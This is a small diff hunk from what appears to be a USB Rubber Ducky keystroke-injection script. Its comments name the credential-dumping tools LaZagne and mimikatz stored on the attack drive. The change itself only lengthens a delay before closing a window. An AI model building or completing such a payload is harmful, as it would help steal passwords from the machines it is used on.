@@ -9,7 +9,7 @@ REM folder DUCKY_DRIVE\data\laZagne and DUCKY_DRIVE\data\mimikatz
 REM lazagne.exe in DUCKY_DRIVE\exec
 REM mimikatz.ps1 in DUCKY_DRIVE\exec
 REM -------------------------------------------------------------------------------------
-DELAY 5000
+DELAY 7000
 ALT F4
 DELAY 500
 ESCAPE
